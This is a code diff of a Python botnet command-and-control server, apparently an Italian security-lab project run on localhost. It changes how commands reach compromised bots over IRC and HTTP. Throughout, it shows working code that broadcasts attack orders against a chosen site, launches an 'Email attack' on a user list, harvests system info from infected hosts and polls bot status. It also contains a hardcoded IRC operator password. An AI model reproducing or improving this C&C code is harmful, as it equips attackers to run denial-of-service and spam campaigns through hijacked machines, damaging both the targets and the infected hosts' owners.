@@ -16,8 +16,8 @@ def sendMessage(s, message):
 def readMessage(s):
     buff = s.recv(2048).decode("UTF-8")
     message = buff.split("\r\n")
+    res = []
     for m in message:
-        print(m)
         if m.startswith("PING"):
             sendMessage(s, "PONG :botnet.sicurezza.com")
         if m.startswith(":bot-"):
@@ -25,10 +25,9 @@ def readMessage(s):
                 return True
             comando = m[m.index(":#botnet: ") + 10::]
             comando = comando.split("|")
-            if comando[0] == "systemInfo":
-                return comando[1]
-            else:
-                return comando
+            comando.insert(0,(m[m.index(":bot-")+5:m.index("!")]).replace("-", "."))
+            res.append(comando)
+    return res
 
 
 def irc():
@@ -36,13 +35,16 @@ def irc():
     CHANNEL = "#botnet"
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect(("127.0.0.1", 6697))
+        s.connect(("127.0.0.1", 6667))
         s.settimeout(5)
         s.send(bytes(f"NICK {NICKNAME}\r\n", "UTF-8"))
         s.send(bytes(f"USER {NICKNAME} {NICKNAME} {NICKNAME} :{NICKNAME}:\r\n", "UTF-8"))
-        sleep(2)
+        sleep(1)
         sendMessage(s, f"JOIN {CHANNEL}:\r\n")
-        sleep(2)
+        sleep(1)
+        readMessage(s)
+        sendMessage(s, f"OPER cc s3cret\r\n")
+        sleep(1)
         readMessage(s)
         return s
     except Exception as e:
@@ -71,6 +73,7 @@ class CC:
             continue
         self.activeBotSM = False
         self.activeBot[ip] = json.loads(data)
+        print("\nBot", ip, "connected\nC&C@command: ", end="")
         self.activeBotSM = True
         return True
 
@@ -138,6 +141,29 @@ class CC:
                 rm.append(k)
         for k in rm:
             del self.activeBot[k]
+
+    def getHTTPStatus(self, target=""):
+        print("Invio richiesta...")
+        if target == "":
+            for k, v in self.activeBot.items():
+                try:
+                    url = "http://" + k + ":" + str(v["http"]) + "/status"
+                    response = requests.get(url, timeout=10)
+                    res = response.json()
+                    self.activeBot[k]["target"] = res["target"]
+                    self.activeBot[k]["action"] = res["action"]
+                except Exception as e:
+                    print("Impossibile inviare la richiesta a", k, e)
+        else:
+            try:
+                url = "http://" + target + ":" + str(self.activeBot[target]["http"]) + "/status"
+                response = requests.get(url, timeout=10)
+                res = response.json()
+                self.activeBot[target]["target"] = res["target"]
+                self.activeBot[target]["action"] = res["action"]
+            except Exception as e:
+                print("Impossibile inviare la richiesta a", target, e)
+        print("Richiesta inviata")
 
     def makeHTTPRequest(self, server, time=1, target=""):
         print("Invio richiesta...")
@@ -257,22 +283,25 @@ class CC:
             print("IRC connection error")
             return
         if target == "":
-            for k, v in self.activeBot.items():
-                try:
-                    sendMessage(s, f"PRIVMSG bot-{k.replace('.', '-')} #botnet: get|{server}|{time}")
-                    sleep(1)
-                    res = readMessage(s)
-                    self.activeBot[k]["target"] = res[1]
-                    self.activeBot[k]["action"] = res[2]
-                except Exception as e:
-                    print("Impossibile inviare la richiesta a",k, e)
+            try:
+                sendMessage(s, f"PRIVMSG $* #botnet: get|{server}|{time}")
+                sleep(2)
+                res = readMessage(s)
+                for m in res:
+                    if m[1] == "info":
+                        self.activeBot[m[0]]["target"] = m[2]
+                        self.activeBot[m[0]]["action"] = m[3]
+            except Exception as e:
+                print("Impossibile inviare la richiesta:", e)
         else:
             try:
                 sendMessage(s, f"PRIVMSG bot-{target.replace('.', '-')} #botnet: get|{server}|{time}")
                 sleep(1)
                 res = readMessage(s)
-                self.activeBot[target]["target"] = res[1]
-                self.activeBot[target]["action"] = res[2]
+                for m in res:
+                    if m[0] == target and m[1] == "info":
+                        self.activeBot[m[0]]["target"] = m[2]
+                        self.activeBot[m[0]]["action"] = m[3]
             except Exception as e:
                 print("Impossibile inviare la richiesta a", target, e)
         closeIrc(s)
@@ -283,22 +312,25 @@ class CC:
             print("IRC connection error")
             return
         if target == "":
-            for k, v in self.activeBot.items():
-                try:
-                    sendMessage(s, f"PRIVMSG bot-{k.replace('.', '-')} #botnet: stop")
-                    sleep(1)
-                    res = readMessage(s)
-                    self.activeBot[k]["target"] = res[1]
-                    self.activeBot[k]["action"] = res[2]
-                except Exception as e:
-                    print("Impossibile inviare la richiesta a",k, e)
+            try:
+                sendMessage(s, f"PRIVMSG $* #botnet: stop")
+                sleep(2)
+                res = readMessage(s)
+                for m in res:
+                    if m[1] == "info":
+                        self.activeBot[m[0]]["target"] = m[2]
+                        self.activeBot[m[0]]["action"] = m[3]
+            except Exception as e:
+                print("Impossibile inviare la richiesta:", e)
         else:
             try:
                 sendMessage(s, f"PRIVMSG bot-{target.replace('.', '-')} #botnet: stop")
                 sleep(1)
                 res = readMessage(s)
-                self.activeBot[target]["target"] = res[1]
-                self.activeBot[target]["action"] = res[2]
+                for m in res:
+                    if m[0] == target and m[1] == "info":
+                        self.activeBot[m[0]]["target"] = m[2]
+                        self.activeBot[m[0]]["action"] = m[3]
             except Exception as e:
                 print("Impossibile inviare la richiesta a", target, e)
         closeIrc(s)
@@ -309,24 +341,35 @@ class CC:
             print("IRC connection error")
             return
         if target == "":
-            for k, v in self.activeBot.items():
-                try:
-                    sendMessage(s, f"PRIVMSG bot-{k.replace('.', '-')} #botnet: systemInfo")
-                    sleep(1)
-                    res = readMessage(s)
-                    res = json.loads(res)
-                    print("\t-----System info about", k, "-----")
-                    for j, z in res.items():
-                        if len(j) <= 6:
-                            print("\t" + j + ":\t\t\t", z)
-                        else:
-                            print("\t" + j + ":\t\t", z)
-                except Exception as e:
-                    print("Impossibile inviare la richiesta a",k, e)
+            try:
+                sendMessage(s, f"PRIVMSG $* #botnet: systemInfo")
+                sleep(2)
+                res = readMessage(s)
+                for m in res:
+                    if m[1] == "systemInfo":
+                        value = json.loads(m[2])
+                        print("\t-----System info about", m[0], "-----")
+                        for j, z in value.items():
+                            if len(j) <= 6:
+                                print("\t" + j + ":\t\t\t", z)
+                            else:
+                                print("\t" + j + ":\t\t", z)
+            except Exception as e:
+                print("Impossibile inviare la richiesta a", e)
         else:
             try:
                 sendMessage(s, f"PRIVMSG bot-{target.replace('.', '-')} #botnet: systemInfo")
-                readMessage(s)
+                sleep(1)
+                res = readMessage(s)
+                for m in res:
+                    if m[0] == target and m[1] == "systemInfo":
+                        value = json.loads(m[2])
+                        print("\t-----System info about", m[0], "-----")
+                        for j, z in value.items():
+                            if len(j) <= 6:
+                                print("\t" + j + ":\t\t\t", z)
+                            else:
+                                print("\t" + j + ":\t\t", z)
             except Exception as e:
                 print("Impossibile inviare la richiesta a", target, e)
         closeIrc(s)
@@ -352,22 +395,25 @@ class CC:
             return
 
         if target == "":
-            for k, v in self.activeBot.items():
-                try:
-                    sendMessage(s, f"PRIVMSG bot-{k.replace('.', '-')} #botnet: send|{oggetto}|{messaggio}|{users}")
-                    sleep(1)
-                    res = readMessage(s)
-                    self.activeBot[k]["target"] = res[1]
-                    self.activeBot[k]["action"] = res[2]
-                except Exception as e:
-                    print("Impossibile inviare la richiesta a",k, e)
+            try:
+                sendMessage(s, f"PRIVMSG $* #botnet: send|{oggetto}|{messaggio}|{users}")
+                sleep(1)
+                res = readMessage(s)
+                for m in res:
+                    if m[1] == "info":
+                        self.activeBot[m[0]]["target"] = m[2]
+                        self.activeBot[m[0]]["action"] = m[3]
+            except Exception as e:
+                print("Impossibile inviare la richiesta:", e)
         else:
             try:
                 sendMessage(s, f"PRIVMSG bot-{target.replace('.', '-')} #botnet: send|{oggetto}|{messaggio}|{users}")
                 sleep(1)
                 res = readMessage(s)
-                self.activeBot[target]["target"] = res[1]
-                self.activeBot[target]["action"] = res[2]
+                for m in res:
+                    if m[0] == target and m[1] == "info":
+                        self.activeBot[m[0]]["target"] = m[2]
+                        self.activeBot[m[0]]["action"] = m[3]
             except Exception as e:
                 print("Impossibile inviare la richiesta a", target, e)
         closeIrc(s)
@@ -378,22 +424,25 @@ class CC:
             print("IRC connection error")
             return
         if target == "":
-            for k, v in self.activeBot.items():
-                try:
-                    sendMessage(s, f"PRIVMSG bot-{k.replace('.', '-')} #botnet: status")
-                    sleep(1)
-                    res = readMessage(s)
-                    self.activeBot[k]["target"] = res[1]
-                    self.activeBot[k]["action"] = res[2]
-                except Exception as e:
-                    print("Impossibile inviare la richiesta a", k, e)
+            try:
+                sendMessage(s, f"PRIVMSG $* #botnet: status")
+                sleep(1)
+                res = readMessage(s)
+                for m in res:
+                    if m[1] == "info":
+                        self.activeBot[m[0]]["target"] = m[2]
+                        self.activeBot[m[0]]["action"] = m[3]
+            except Exception as e:
+                print("Impossibile inviare la richiesta:", e)
         else:
             try:
                 sendMessage(s, f"PRIVMSG bot-{target.replace('.', '-')} #botnet: status")
                 sleep(1)
                 res = readMessage(s)
-                self.activeBot[target]["target"] = res[1]
-                self.activeBot[target]["action"] = res[2]
+                for m in res:
+                    if m[0] == target and m[1] == "info":
+                        self.activeBot[m[0]]["target"] = m[2]
+                        self.activeBot[m[0]]["action"] = m[3]
             except Exception as e:
                 print("Impossibile inviare la richiesta a", target, e)
         closeIrc(s)
@@ -408,7 +457,7 @@ class CC:
                   "\t4) Get info about bot\n"
                   "\t5) Email attack\n"
                   "\t6) Stop all attacks\n"
-                  "\t7) Get bot statys\n"
+                  "\t7) Get bot status\n"
                   "\t8) Check bot service\n"
                   "\t9) Stop CC\n")
             comando = input("C&C@command: ")
@@ -419,10 +468,10 @@ class CC:
                         for k, v in self.activeBot.items():
                             print(f"{k}\t{v['http']}\t\t{v['irc']}")
                 case 2:
-                    print("Ip\t\thttp\t\tirc\t\ttarget\t\taction")
+                    print("Ip\t\thttp\t\tirc\t\ttarget\t\t\t\taction")
                     if len(self.activeBot) > 0:
                         for k, v in self.activeBot.items():
-                            print(f"{k}\t{v['http']}\t\t{v['irc']}\t\t{v['target']}\t\t{v['action']}")
+                            print(f"{k}\t{v['http']}\t\t{v['irc']}\t\t{v['target']}\t{v['action']}") if len(v['target']) > 5 else print(f"{k}\t{v['http']}\t\t{v['irc']}\t\t{v['target']}\t\t\t\t{v['action']}")
                 case 3:
                     service = input("Select type of attack(1=HTTP, 2=IRC): ")
                     site = input("Enter site url: ")
@@ -457,9 +506,9 @@ class CC:
                     service = input("Select type of attack(1=HTTP, 2=IRC): ")
                     target = input("Enter target(ip or all): ")
                     if target == "all":
-                        self.stopHTTPAttack() if service == "1" else self.stopIRCAttack()
+                        self.getHTTPStatus() if service == "1" else self.getIRCStatus()
                     else:
-                        self.stopHTTPAttack(target=target) if service == "1" else self.stopIRCAttack(target=target)
+                        self.getHTTPStatus(target=target) if service == "1" else self.getIRCStatus(target=target)
                 case 8:
                     self.checkBot()
                 case 9:
